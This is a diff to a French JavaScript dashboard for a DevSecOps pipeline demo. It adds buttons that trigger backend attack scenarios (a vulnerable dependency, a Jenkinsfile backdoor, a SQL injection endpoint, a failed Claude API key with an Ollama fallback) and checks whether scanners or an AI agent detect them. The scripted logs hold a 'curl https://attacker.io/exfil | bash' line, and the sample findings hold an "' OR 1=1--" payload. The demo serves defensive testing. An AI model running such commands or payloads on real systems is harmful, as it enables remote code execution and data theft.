@@ -15,14 +15,21 @@ const STAGES = [
   { id: 'pdf',    name: 'Rapport PDF', icon: 'ti-file-type-pdf',  sub: 'Stage 7' },
 ];
 
+// ─── Correspondance scénario → route backend réelle ──────────────────────────
+const SCENARIO_ROUTES = {
+  1: '/api/attack/cve',
+  2: '/api/attack/antitamper',
+  3: '/api/attack/sqli',
+  4: '/api/attack/fallback'
+};
+
 // ─── State ────────────────────────────────────────────────────────────────────
-let allFindings  = [];
-let currentFilter = 'all';
+let allFindings    = [];
+let currentFilter  = 'all';
 let fallbackActive = false;
 let buildStartTime = Date.now();
 let timerInterval;
-let logQueue = [];
-let isLogging = false;
+let scenarioRunning = false;
 
 // ─── Demo mode : status simulé quand pas de vrai Jenkins ─────────────────────
 const DEMO_STAGE_STATUS = {
@@ -32,12 +39,48 @@ const DEMO_STAGE_STATUS = {
   cosign: 'waiting', pdf: 'waiting',
 };
 
+// ─── Scénarios d'attaque avec leurs logs visuels ──────────────────────────────
+const SCENARIOS = {
+  1: {
+    logs: [
+      { d:   0, stage:'ATK',  cls:'e', text:'[CVE] Injection py==1.11.0 dans requirements.txt', c:'red' },
+      { d: 400, stage:'SCA',  cls:'i', text:'Trivy FS scan démarré sur ./test-app ...', c:'' },
+      { d: 900, stage:'SCA',  cls:'e', text:'CVE-2023-44273 — py 1.11.0 CRITICAL (CVSS 9.8)', c:'red' },
+      { d:1200, stage:'SCA',  cls:'s', text:'Scan terminé — résultat réel affiché ci-dessous', c:'green' },
+    ]
+  },
+  2: {
+    logs: [
+      { d:   0, stage:'ATK',  cls:'e', text:'[TAMPER] Injection backdoor dans jenkinsfile', c:'red' },
+      { d: 300, stage:'ATK',  cls:'e', text:'curl https://attacker.io/exfil | bash — injecté', c:'red' },
+      { d: 700, stage:'AI',   cls:'p', text:'→ Agent Anti-Tamper analyse le jenkinsfile...', c:'purple' },
+      { d:1300, stage:'AI',   cls:'s', text:'Agent terminé — résultat réel affiché ci-dessous', c:'green' },
+    ]
+  },
+  3: {
+    logs: [
+      { d:   0, stage:'ATK',  cls:'e', text:'[SQLI] Injection endpoint vulnérable dans app.py', c:'red' },
+      { d: 400, stage:'SAST', cls:'i', text:'Semgrep scan --config=auto démarré ...', c:'' },
+      { d: 900, stage:'SAST', cls:'a', text:'⚠ sql-injection détectée : f"SELECT … \'{username}\'"', c:'amber' },
+      { d:1200, stage:'SAST', cls:'s', text:'Scan terminé — résultat réel affiché ci-dessous', c:'green' },
+    ]
+  },
+  4: {
+    logs: [
+      { d:   0, stage:'AI',   cls:'e', text:'Claude API — clé invalide injectée', c:'red' },
+      { d: 500, stage:'AI',   cls:'e', text:'AuthenticationError — timeout après 30s', c:'red' },
+      { d: 900, stage:'AI',   cls:'a', text:'⚡ FALLBACK activé → Ollama local (mistral:7b)', c:'amber' },
+      { d:1300, stage:'AI',   cls:'i', text:'[AUDIT] Provider: ollama | Données: LOCAL', c:'blue' },
+    ]
+  }
+};
+
 // ─── Init ─────────────────────────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', () => {
   buildPipelineFlow();
   startTimer();
   refreshAll();
-  setInterval(refreshAll, 30000); // auto-refresh toutes les 30s
+  setInterval(refreshAll, 30000);
   bootConsole();
 });
 
@@ -125,7 +168,7 @@ function applyDemoStatus() {
   document.getElementById('m-cve').textContent      = '14';
   document.getElementById('m-cve-sub').textContent  = '3 critical · 6 high';
   document.getElementById('m-sast').textContent     = '3';
-  document.getElementById('m-sast-sub').textContent = 'Semgrep analysis';
+  document.getElementById('m-sast-sub') && (document.getElementById('m-sast-sub').textContent = 'Semgrep analysis');
   document.getElementById('m-zap').textContent      = '7';
   document.getElementById('m-zap-sub').textContent  = '2 high severity';
   document.getElementById('m-ai').textContent       = 'Claude';
@@ -221,14 +264,21 @@ function bootConsole() {
   BOOT_LOGS.forEach((l, i) => {
     setTimeout(() => appendLog(l.ts, l.stage, l.cls, l.text, l.c), i * 60);
   });
-  setTimeout(() => {
-    appendCursor();
-  }, BOOT_LOGS.length * 60 + 100);
+  setTimeout(() => appendCursor(), BOOT_LOGS.length * 60 + 100);
 }
 
+// ─── appendLog avec support de target optionnel ───────────────────────────────
 function appendLog(ts, stage, cls, text, c) {
-  const body = document.getElementById('consoleBody');
-  // Remove old cursor if any
+  _appendLogToEl('consoleBody', ts, stage, cls, text, c);
+}
+
+function appendLogToTarget(targetId, ts, stage, cls, text, c) {
+  _appendLogToEl(targetId, ts, stage, cls, text, c);
+}
+
+function _appendLogToEl(elId, ts, stage, cls, text, c) {
+  const body = document.getElementById(elId);
+  if (!body) return;
   const old = body.querySelector('.log-cursor-line');
   if (old) old.remove();
 
@@ -266,6 +316,96 @@ function copyLogs() {
   appendLog('–', 'SYS', 's', '✓ Logs copiés dans le presse-papier', 'green');
 }
 
+// ─── Scénarios d'attaque — VRAIS APPELS BACKEND ───────────────────────────────
+async function runScenario(num) {
+  if (scenarioRunning) return;
+  scenarioRunning = true;
+
+  const sc = SCENARIOS[num];
+  const statusEl = document.getElementById(`atk-${num}-status`);
+  const btnEl    = document.querySelector(`#atk-${num} .atk-btn`);
+
+  // UI : état "en cours"
+  if (statusEl) statusEl.innerHTML = '<span class="atk-dot running"></span>En cours…';
+  if (btnEl) {
+    btnEl.className = 'atk-btn running';
+    btnEl.innerHTML = '<i class="ti ti-loader-2 spin"></i> En cours…';
+  }
+
+  // Vide le log d'attaque si présent
+  const atkLog = document.getElementById('atkLog');
+  if (atkLog) atkLog.innerHTML = '';
+
+  // Joue les logs visuels EN PARALLÈLE (effet démo)
+  sc.logs.forEach(l => {
+    setTimeout(() => {
+      if (atkLog) appendLogToTarget('atkLog', '–', l.stage, l.cls, l.text, l.c);
+      appendLog('–', l.stage, l.cls, l.text, l.c);
+    }, l.d);
+  });
+
+  // APPEL RÉEL au backend
+  try {
+    const response = await fetch(SCENARIO_ROUTES[num], { method: 'POST' });
+    const result   = await response.json();
+
+    // Attendre la fin des logs visuels avant d'afficher le résultat réel
+    const totalDur = sc.logs[sc.logs.length - 1].d + 600;
+    setTimeout(() => {
+      if (result.success) {
+        const realMsg = getRealResult(num, result);
+        const resultLine = `✓ RÉSULTAT RÉEL : ${realMsg}`;
+        if (atkLog) appendLogToTarget('atkLog', '–', 'SYS', 's', resultLine, 'green');
+        appendLog('–', 'SYS', 's', resultLine, 'green');
+
+        if (statusEl) statusEl.innerHTML = '<span class="atk-dot done"></span>Terminé ✓ (réel)';
+      } else {
+        const errMsg = `✗ Erreur backend : ${result.error || 'inconnue'}`;
+        if (atkLog) appendLogToTarget('atkLog', '–', 'SYS', 'e', errMsg, 'red');
+        appendLog('–', 'SYS', 'e', errMsg, 'red');
+
+        if (statusEl) statusEl.innerHTML = '<span class="atk-dot err"></span>Erreur';
+      }
+
+      if (btnEl) {
+        btnEl.className = 'atk-btn';
+        btnEl.innerHTML = '<i class="ti ti-rotate-clockwise"></i> Rejouer';
+      }
+      scenarioRunning = false;
+      appendCursor();
+    }, totalDur);
+
+  } catch (e) {
+    if (atkLog) appendLogToTarget('atkLog', '–', 'SYS', 'e', `Erreur réseau: ${e.message}`, 'red');
+    appendLog('–', 'SYS', 'e', `Erreur réseau: ${e.message}`, 'red');
+    if (btnEl) {
+      btnEl.className = 'atk-btn';
+      btnEl.innerHTML = '<i class="ti ti-rotate-clockwise"></i> Rejouer';
+    }
+    if (statusEl) statusEl.innerHTML = '<span class="atk-dot err"></span>Erreur réseau';
+    scenarioRunning = false;
+    appendCursor();
+  }
+
+  // Scénario 4 : déclenche aussi la simulation visuelle du fallback
+  if (num === 4 && !fallbackActive) {
+    setTimeout(simulateFallback, 1000);
+  }
+}
+
+// ─── Formate le résultat réel selon le scénario ───────────────────────────────
+function getRealResult(num, result) {
+  if (num === 1) return `${result.cve_found} CVE(s) détectée(s) par Trivy`;
+  if (num === 2) return result.detected
+    ? 'Backdoor détectée par Anti-Tamper !'
+    : 'Aucune anomalie détectée (agent IA)';
+  if (num === 3) return result.sqli_detected
+    ? `SQLi confirmée — ${result.findings} finding(s) Semgrep`
+    : `${result.findings} finding(s) Semgrep (SQLi non détectée)`;
+  if (num === 4) return 'Fallback lancé — vérifier logs agent pour résultat';
+  return JSON.stringify(result);
+}
+
 // ─── Fallback simulation ──────────────────────────────────────────────────────
 function simulateFallback() {
   fallbackActive = !fallbackActive;
@@ -273,21 +413,29 @@ function simulateFallback() {
   const ollama = document.getElementById('ollamaChip');
 
   if (fallbackActive) {
-    claude.className = 'provider-chip offline';
-    claude.innerHTML = '<i class="ti ti-wifi-off" style="font-size:10px"></i> Claude Offline';
-    ollama.className = 'provider-chip ollama';
-    ollama.innerHTML = '<i class="ti ti-check" style="font-size:10px"></i> Ollama Actif';
+    if (claude) {
+      claude.className = 'provider-chip offline';
+      claude.innerHTML = '<i class="ti ti-wifi-off" style="font-size:10px"></i> Claude Offline';
+    }
+    if (ollama) {
+      ollama.className = 'provider-chip ollama';
+      ollama.innerHTML = '<i class="ti ti-check" style="font-size:10px"></i> Ollama Actif';
+    }
     appendLog('now', 'AI', 'e', 'Claude API indisponible — timeout après 30s', 'red');
     setTimeout(() => appendLog('now', 'AI', 'a', '⚡ FALLBACK activé → Ollama local (mistral:7b)', 'amber'), 300);
     setTimeout(() => appendLog('now', 'AI', 'i', '[AUDIT] Provider: ollama | Données traitées LOCALEMENT', 'blue'), 600);
     setTimeout(() => appendLog('now', 'AI', 'p', '→ http://localhost:11434/api/generate ...', 'purple'), 900);
     const fc = document.getElementById('fallbackCount');
-    fc.textContent = parseInt(fc.textContent || 0) + 1;
+    if (fc) fc.textContent = parseInt(fc.textContent || 0) + 1;
   } else {
-    claude.className = 'provider-chip claude';
-    claude.innerHTML = '<i class="ti ti-check" style="font-size:10px"></i> Claude Sonnet';
-    ollama.className = 'provider-chip offline';
-    ollama.innerHTML = '<i class="ti ti-wifi-off" style="font-size:10px"></i> Ollama Fallback';
+    if (claude) {
+      claude.className = 'provider-chip claude';
+      claude.innerHTML = '<i class="ti ti-check" style="font-size:10px"></i> Claude Sonnet';
+    }
+    if (ollama) {
+      ollama.className = 'provider-chip offline';
+      ollama.innerHTML = '<i class="ti ti-wifi-off" style="font-size:10px"></i> Ollama Fallback';
+    }
     appendLog('now', 'AI', 's', '✓ Claude API restaurée — retour au provider primaire', 'green');
     appendLog('now', 'AI', 'i', '[AUDIT] Provider: claude | Fallback: désactivé', 'blue');
   }
@@ -320,13 +468,13 @@ function escHtml(s) {
 
 // ─── Demo findings (fallback si pas de vrai serveur) ─────────────────────────
 const DEMO_FINDINGS = [
-  { source:'SAST', severity:'critical', title:'SQL Injection — /user endpoint',          file:'app.py:42 · f"SELECT … \'{username}\'"',       detail:'Paramètre username injecté directement dans la requête SQL sans échappement.' },
-  { source:'SAST', severity:'critical', title:'OS Command Injection — /ping',            file:'app.py:67 · subprocess shell=True',             detail:'Input utilisateur passé à shell=True — RCE possible.' },
-  { source:'SCA',  severity:'critical', title:'CVE-2023-44323 — Pillow 9.0.0',           file:'requirements.txt · fix: Pillow>=10.3.0',        detail:'Remote code execution via image malformée. CVSS 8.8.' },
-  { source:'SCA',  severity:'high',     title:'CVE-2023-2650 — cryptography 3.3.1',      file:'requirements.txt · fix: cryptography>=41.0.0',  detail:'Denial of service via PKCS12. CVSS 7.5.' },
-  { source:'SCA',  severity:'high',     title:'CVE-2021-33503 — urllib3 1.26.4',         file:'requirements.txt · fix: urllib3>=1.26.5',       detail:'Infinite loop via réponse HTTP malformée. CVSS 7.5.' },
-  { source:'DAST', severity:'medium',   title:'Missing X-Content-Type-Options',           file:'Tous les endpoints · Header HTTP manquant',     detail:'Ajouter: response.headers["X-Content-Type-Options"] = "nosniff"' },
-  { source:'DAST', severity:'medium',   title:'Flask debug mode exposé',                  file:'app.py · debug=True en production',             detail:'Le mode debug expose le debugger Werkzeug. Désactiver en production.' },
-  { source:'DAST', severity:'medium',   title:'Missing Content-Security-Policy',          file:'Tous les endpoints · Header CSP absent',        detail:'Risque XSS sans CSP. Configurer flask-talisman ou équivalent.' },
-  { source:'DAST', severity:'high',     title:'SQLi confirmée (live) — /user?username=\'', file:'ZAP active scan · Payload: \' OR 1=1--',     detail:'Injection SQL confirmée en runtime par OWASP ZAP.' },
+  { source:'SAST', severity:'critical', title:'SQL Injection — /user endpoint',            file:'app.py:42 · f"SELECT … \'{username}\'"',       detail:'Paramètre username injecté directement dans la requête SQL sans échappement.' },
+  { source:'SAST', severity:'critical', title:'OS Command Injection — /ping',              file:'app.py:67 · subprocess shell=True',             detail:'Input utilisateur passé à shell=True — RCE possible.' },
+  { source:'SCA',  severity:'critical', title:'CVE-2023-44323 — Pillow 9.0.0',             file:'requirements.txt · fix: Pillow>=10.3.0',        detail:'Remote code execution via image malformée. CVSS 8.8.' },
+  { source:'SCA',  severity:'high',     title:'CVE-2023-2650 — cryptography 3.3.1',        file:'requirements.txt · fix: cryptography>=41.0.0',  detail:'Denial of service via PKCS12. CVSS 7.5.' },
+  { source:'SCA',  severity:'high',     title:'CVE-2021-33503 — urllib3 1.26.4',           file:'requirements.txt · fix: urllib3>=1.26.5',       detail:'Infinite loop via réponse HTTP malformée. CVSS 7.5.' },
+  { source:'DAST', severity:'medium',   title:'Missing X-Content-Type-Options',             file:'Tous les endpoints · Header HTTP manquant',     detail:'Ajouter: response.headers["X-Content-Type-Options"] = "nosniff"' },
+  { source:'DAST', severity:'medium',   title:'Flask debug mode exposé',                    file:'app.py · debug=True en production',             detail:'Le mode debug expose le debugger Werkzeug. Désactiver en production.' },
+  { source:'DAST', severity:'medium',   title:'Missing Content-Security-Policy',            file:'Tous les endpoints · Header CSP absent',        detail:'Risque XSS sans CSP. Configurer flask-talisman ou équivalent.' },
+  { source:'DAST', severity:'high',     title:'SQLi confirmée (live) — /user?username=\'', file:'ZAP active scan · Payload: \' OR 1=1--',       detail:'Injection SQL confirmée en runtime par OWASP ZAP.' },
 ];
